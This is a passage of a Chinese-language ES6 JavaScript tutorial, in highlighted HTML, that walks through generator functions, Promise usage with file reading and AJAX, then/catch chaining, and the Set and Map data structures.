class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">444</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">gen</span>();</span><br><span class="line"><span class="comment">// iterator.next() // 111</span></span><br><span class="line"><span class="comment">// iterator.next() // 222</span></span><br><span class="line"><span class="comment">//console.log(iterator.next()); // 111 &#123;value: &#x27;一只没有耳朵&#x27;, done: false&#125;</span></span><br><span class="line"><span class="comment">//console.log(iterator.next()); // 222 &#123;value: &#x27;一只没有尾部&#x27;, done: false&#125;</span></span><br><span class="line"><span class="comment">//console.log(iterator.next());</span></span><br><span class="line"><span class="comment">//console.log(iterator.next()); // 444 &#123;value: undefined, done: true&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> <span class="title function_">gen</span>())&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="生成器函数参数"><a href="#生成器函数参数" class="headerlink" title="生成器函数参数"></a>生成器函数参数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> * <span class="title function_">gen</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(arg);</span><br><span class="line">  <span class="keyword">let</span> one = <span class="keyword">yield</span> <span class="number">111</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(one);</span><br><span class="line">  <span class="keyword">let</span> two = <span class="keyword">yield</span> <span class="number">222</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(two);</span><br><span class="line">  <span class="keyword">let</span> three = <span class="keyword">yield</span> <span class="number">333</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(three);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行获取迭代器对象</span></span><br><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">gen</span>(<span class="string">&#x27;AAA&#x27;</span>);</span><br><span class="line"><span class="comment">// iterator.next() // AAA</span></span><br><span class="line"><span class="comment">// iterator.next(&#x27;BBB&#x27;) // BBB</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>()); <span class="comment">// AAA &#123;value: 111, done: false&#125;</span></span><br><span class="line"><span class="comment">//next方法可以传入实参</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>(<span class="string">&#x27;BBB&#x27;</span>)); <span class="comment">// BBB &#123;value: 222, done: false&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>(<span class="string">&#x27;CCC&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>(<span class="string">&#x27;DDD&#x27;</span>)); <span class="comment">// DDD &#123;value: undefined, done: true&#125;</span></span><br></pre></td></tr></table></figure><h3 id="生成器函数实例"><a href="#生成器函数实例" class="headerlink" title="生成器函数实例"></a>生成器函数实例</h3><ul><li>1s 后控制台输出 111  2s后输出 222  3s后输出 333</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下面现象：回调地狱</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">333</span>);</span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">  &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*******************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">one</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>);</span><br><span class="line">    iterator.<span class="title function_">next</span>();</span><br><span class="line">  &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">two</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>);</span><br><span class="line">    iterator.<span class="title function_">next</span>();</span><br><span class="line">  &#125;,<span class="number">2000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">three</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">333</span>);</span><br><span class="line">    iterator.<span class="title function_">next</span>();</span><br><span class="line">  &#125;,<span class="number">3000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> * <span class="title function_">gen</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="title function_">one</span>();</span><br><span class="line">  <span class="keyword">yield</span> <span class="title function_">two</span>();</span><br><span class="line">  <span class="keyword">yield</span> <span class="title function_">three</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用生成器函数</span></span><br><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">gen</span>();</span><br><span class="line">iterator.<span class="title function_">next</span>();</span><br></pre></td></tr></table></figure><ul><li>模拟获取–&gt;用户数据–&gt;订单数据–&gt;商品数据 </li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getUsers</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;用户数据&#x27;</span>;</span><br><span class="line">    <span class="comment">//调用 next 方法, 并且将数据传入</span></span><br><span class="line">    iterator.<span class="title function_">next</span>(data);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getOrders</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(users)</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;订单数据&#x27;</span>;</span><br><span class="line">    iterator.<span class="title function_">next</span>(data);</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getGoods</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;商品数据&#x27;</span>;</span><br><span class="line">    iterator.<span class="title function_">next</span>(data);</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> * <span class="title function_">gen</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> users = <span class="keyword">yield</span> <span class="title function_">getUsers</span>();</span><br><span class="line">  <span class="keyword">let</span> orders = <span class="keyword">yield</span> <span class="title function_">getOrders</span>(users);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(orders)</span><br><span class="line">  <span class="keyword">let</span> goods = <span class="keyword">yield</span> <span class="title function_">getGoods</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用生成器函数</span></span><br><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">gen</span>();</span><br><span class="line">iterator.<span class="title function_">next</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 执行结果：</span></span><br><span class="line"><span class="comment">* 用户数据</span></span><br><span class="line"><span class="comment">* 订单数据</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><h3 id="Promise基本语法"><a href="#Promise基本语法" class="headerlink" title="Promise基本语法"></a>Promise基本语法</h3><p><strong>Promise 是 ES6 引入的<code>异步编程</code>的新解决方案。语法上 Promise 是一个<code>构造函数</code>，用来封装异步操作并可以获取其<code>成功</code>或<code>失败</code>的结果</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://blog.csdn.net/weixin_45406850/article/details/122041770</span></span><br><span class="line"><span class="comment">//实例化 Promise 对象，接收一个参数（参数是一个函数，函数有两个形参，resolve, reject）</span></span><br><span class="line"><span class="comment">//函数里面封装一个异步操作</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;</span><br><span class="line">    <span class="comment">// 异步任务</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;数据库中的用户数据&#x27;</span>;</span><br><span class="line">    <span class="title function_">resolve</span>(data); <span class="comment">// 调用resolve函数表示成功，Promise状态成功</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//let err = &#x27;数据读取失败&#x27;;</span></span><br><span class="line">    <span class="comment">//reject(err); // // 调用reject函数表示失败，Promise状态失败</span></span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//resolve函数/reject函数改变Promise状态，改变状态后调用then方法里面的回调</span></span><br><span class="line"><span class="comment">//调用 promise 对象的 then 方法，接收两个参数，两个参数都是函数，每个函数都有一个形参</span></span><br><span class="line">p.<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="comment">// 成功</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">// 数据库中的用户数据</span></span><br><span class="line">&#125;, <span class="keyword">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">    <span class="comment">// 失败</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(reason);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="Promise封装读取文件"><a href="#Promise封装读取文件" class="headerlink" title="Promise封装读取文件"></a>Promise封装读取文件</h3><ul><li>读取resources文件夹下的为学.md文件，在控制台输出</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. 引入 fs 模块</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 调用方法读取文件</span></span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./resources/为学.md&#x27;</span>, <span class="function">(<span class="params">err, data</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//如果失败, 则抛出错误</span></span><br><span class="line">    <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="comment">//如果没有出错, 则输出内容</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 执行上面代码：node 当前代码文件名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 使用 Promise 封装</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&quot;./resources/为学.mda&quot;</span>, <span class="function">(<span class="params">err, data</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">//判断如果失败</span></span><br><span class="line">        <span class="keyword">if</span>(err) <span class="title function_">reject</span>(err);</span><br><span class="line">        <span class="comment">//如果成功</span></span><br><span class="line">        <span class="title function_">resolve</span>(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value.<span class="title function_">toString</span>());</span><br><span class="line">&#125;, <span class="keyword">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;读取失败!!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Promise封装AJAX"><a href="#Promise封装AJAX" class="headerlink" title="Promise封装AJAX"></a>Promise封装AJAX</h3><ul><li>原生的AJAX向url发送请求</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接口地址: https://api.apiopen.top/getJoke</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//1. 创建对象</span></span><br><span class="line">  <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//2. 初始化，get请求</span></span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://api.apiopen.top/getJ&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//3. 发送</span></span><br><span class="line">  xhr.<span class="title function_">send</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//4. 绑定事件, 处理响应结果</span></span><br><span class="line">  xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//判断</span></span><br><span class="line">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="comment">//判断响应状态码 200-299</span></span><br><span class="line">      <span class="keyword">if</span> (xhr.<span class="property">status</span> &gt;= <span class="number">200</span> &amp;&amp; xhr.<span class="property">status</span> &lt; <span class="number">300</span>) &#123;</span><br><span class="line">        <span class="comment">//表示成功</span></span><br><span class="line">        <span class="title function_">resolve</span>(xhr.<span class="property">response</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果失败</span></span><br><span class="line">        <span class="title function_">reject</span>(xhr.<span class="property">status</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定回调</span></span><br><span class="line">p.<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">&#125;, <span class="keyword">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(reason);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Promise-prototype-then"><a href="#Promise-prototype-then" class="headerlink" title="Promise.prototype.then"></a>Promise.prototype.then</h3><p><strong><code>then方法</code>的返回结果是 <code>Promise 对象</code>, <code>对象状态</code>由<code>回调函数的执行结果</code>决定</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建 promise 对象</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;用户数据&#x27;</span>);</span><br><span class="line">    <span class="comment">// reject(&#x27;出错啦&#x27;);</span></span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 then 方法 then方法的返回结果是 Promise 对象, 对象状态由回调函数的执行结果决定</span></span><br><span class="line"><span class="comment">//1. 如果回调函数中返回的结果是 非 promise 类型的属性, 状态为成功, 返回值为对象的成功的值</span></span><br><span class="line"><span class="comment">//2. 返回的结果是promise对象，内部promise返回的状态就决定then方法返回的promise状态</span></span><br><span class="line"><span class="comment">//3. 抛出错误，then返回值就是抛出的错误</span></span><br><span class="line"><span class="keyword">const</span> result = p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">  <span class="comment">//1. 非 promise 类型的属性</span></span><br><span class="line">  <span class="comment">// return &#x27;iloveyou&#x27;;</span></span><br><span class="line">  <span class="comment">//2. 是 promise 对象</span></span><br><span class="line">  <span class="comment">// return new Promise((resolve, reject)=&gt;&#123;</span></span><br><span class="line">  <span class="comment">//     // resolve(&#x27;ok&#x27;);</span></span><br><span class="line">  <span class="comment">//     reject(&#x27;error&#x27;);</span></span><br><span class="line">  <span class="comment">// &#125;);</span></span><br><span class="line">  <span class="comment">//3. 抛出错误</span></span><br><span class="line">  <span class="comment">// throw new Error(&#x27;出错啦!&#x27;);</span></span><br><span class="line">  <span class="keyword">throw</span> <span class="string">&#x27;出错啦!&#x27;</span>;</span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span>=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// Promise 对象 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//链式调用，杜绝回调地狱</span></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span>=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 里面放异步任务</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span>=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 里面放异步任务</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实践-读取多个文件"><a href="#实践-读取多个文件" class="headerlink" title="实践-读取多个文件"></a>实践-读取多个文件</h3><ul><li>依次读取三个文件内容，将三个内容合在一起输出</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入 fs 模块</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调地狱，代码往前缩紧</span></span><br><span class="line"><span class="comment">// fs.readFile(&#x27;./resources/为学.md&#x27;, (err, data1)=&gt;&#123;</span></span><br><span class="line"><span class="comment">//     fs.readFile(&#x27;./resources/插秧诗.md&#x27;, (err, data2)=&gt;&#123;</span></span><br><span class="line"><span class="comment">//         fs.readFile(&#x27;./resources/观书有感.md&#x27;, (err, data3)=&gt;&#123;</span></span><br><span class="line"><span class="comment">//             let result = data1 + &#x27;\r\n&#x27; +data2  +&#x27;\r\n&#x27;+ data3;</span></span><br><span class="line"><span class="comment">//             console.log(result);</span></span><br><span class="line"><span class="comment">//         &#125;);</span></span><br><span class="line"><span class="comment">//     &#125;);</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用 promise 实现，异步任务串联</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&quot;./resources/为学.md&quot;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">readFile</span>(<span class="string">&quot;./resources/插秧诗.md&quot;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>([value, data]);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">readFile</span>(<span class="string">&quot;./resources/观书有感.md&quot;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//压入</span></span><br><span class="line">            value.<span class="title function_">push</span>(data);</span><br><span class="line">            <span class="title function_">resolve</span>(value);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value.<span class="title function_">join</span>(<span class="string">&#x27;\r\n&#x27;</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Promise-prototype-catch"><a href="#Promise-prototype-catch" class="headerlink" title="Promise.prototype.catch"></a>Promise.prototype.catch</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//设置 p 对象的状态为失败, 并设置失败的值</span></span><br><span class="line">    <span class="title function_">reject</span>(<span class="string">&quot;出错啦!&quot;</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// p.then(function(value)&#123;</span></span><br><span class="line"><span class="comment">//    </span></span><br><span class="line"><span class="comment">// &#125;, function(reason)&#123;</span></span><br><span class="line"><span class="comment">//     console.error(reason);</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line"></span><br><span class="line">p.<span class="title function_">catch</span>(<span class="keyword">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><hr><h2 id="集合Set"><a href="#集合Set" class="headerlink" title="集合Set"></a>集合Set</h2><h3 id="集合介绍"><a href="#集合介绍" class="headerlink" title="集合介绍"></a>集合介绍</h3><p><strong>ES6 提供了新的数据结构 <code>Set（集合</code>）。它类似于<code>数组</code>，但成员的<code>值都是唯 一</code>的，集合实现了 iterator 接口，所以可以使用<code>『扩展运算符』</code>和<code>『for…of…』</code>进 行遍历。</strong><br><strong>集合的属性和方法：</strong></p><ul><li><ol><li>size 返回集合的元素个数</li></ol></li><li><ol start="2"><li>add 增加一个新元素，返回当前集合</li></ol></li><li><ol start="3"><li>delete 删除元素，返回 boolean 值</li></ol></li><li><ol start="4"><li>has 检测集合中是否包含某个元素，返回 boolean 值</li></ol></li><li><ol start="5"><li>clear 清空集合，返回</li></ol></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明一个空set</span></span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line"><span class="comment">//console.log(s, typeof s) // Set(0)&#123;size: 0&#125; , object</span></span><br><span class="line"><span class="comment">//创建一个非空集合，会去重</span></span><br><span class="line"><span class="keyword">let</span> s2 = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="string">&#x27;大事儿&#x27;</span>,<span class="string">&#x27;小事儿&#x27;</span>,<span class="string">&#x27;好事儿&#x27;</span>,<span class="string">&#x27;坏事儿&#x27;</span>,<span class="string">&#x27;小事儿&#x27;</span>]);</span><br><span class="line"><span class="comment">//console.log(s2) // Set(4)&#123;&#x27;大事儿&#x27;, &#x27;小事儿&#x27;, &#x27;好事儿&#x27;, &#x27;坏事儿&#x27;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(...s2) <span class="comment">// 大事儿 小事儿 好事儿 坏事儿</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//元素个数</span></span><br><span class="line"><span class="comment">// console.log(s2.size); // 4</span></span><br><span class="line"><span class="comment">//添加新的元素</span></span><br><span class="line"><span class="comment">// s2.add(&#x27;喜事儿&#x27;);</span></span><br><span class="line"><span class="comment">//删除元素</span></span><br><span class="line"><span class="comment">// s2.delete(&#x27;坏事儿&#x27;);</span></span><br><span class="line"><span class="comment">//检测</span></span><br><span class="line"><span class="comment">// console.log(s2.has(&#x27;糟心事&#x27;));  // false</span></span><br><span class="line"><span class="comment">//清空</span></span><br><span class="line"><span class="comment">// s2.clear();</span></span><br><span class="line"><span class="comment">// console.log(s2);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> s2)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Set实践"><a href="#Set实践" class="headerlink" title="Set实践"></a>Set实践</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>];</span><br><span class="line"><span class="comment">//1. 数组去重</span></span><br><span class="line"><span class="comment">// let result = [...new Set(arr)];</span></span><br><span class="line"><span class="comment">// console.log(result);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 交集</span></span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"><span class="comment">// let result = [...new Set(arr)].filter(item =&gt; &#123;</span></span><br><span class="line"><span class="comment">//     let s2 = new Set(arr2);// 4 5 6</span></span><br><span class="line"><span class="comment">//     if(s2.has(item))&#123;</span></span><br><span class="line"><span class="comment">//         return true;</span></span><br><span class="line"><span class="comment">//     &#125;else&#123;</span></span><br><span class="line"><span class="comment">//         return false;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line"><span class="comment">// let result = [...new Set(arr)].filter(item =&gt; new Set(arr2).has(item));</span></span><br><span class="line"><span class="comment">// console.log(result);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 并集</span></span><br><span class="line"><span class="comment">// let union = [...new Set([...arr, ...arr2])];</span></span><br><span class="line"><span class="comment">// console.log(union);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 差集 在arr中有，在arr2中没有</span></span><br><span class="line"><span class="keyword">let</span> diff = [...<span class="keyword">new</span> <span class="title class_">Set</span>(arr)].<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !(<span class="keyword">new</span> <span class="title class_">Set</span>(arr2).<span class="title function_">has</span>(item)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(diff);</span><br></pre></td></tr></table></figure><hr><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><p><strong>ES6 提供了 <code>Map 数据结构</code>。它类似于<code>对象</code>，也是<code>键值对</code>的集合。但是<code>“键” </code>的范围不限于<code>字符串</code>，各种类型的值（包括对象）都可以当作键。Map 也实现了 <code>iterator 接口</code>，所以可以使用<code>『扩展运算符』</code>和<code>『for…of…』</code>进行遍历。</strong><br><strong>Map 的属性和方法：</strong></p><ul><li><ol><li>size 返回 Map 的元素个数</li></ol></li><li><ol start="2"><li>set 增加一个新元素，返回当前 Map</li></ol></li><li><ol start="3"><li>get 返回键名对象的键值</li></ol></li><li><ol start="4"><li>has 检测 Map 中是否包含某个元素，返回 boolean 值</li></ol></li><li><ol start="5"><li>clear 清空集合，返回 undefined</li></ol></li><li><ol start="6"><li>delete 根据键名删除</li></ol></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明 Map</span></span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="title 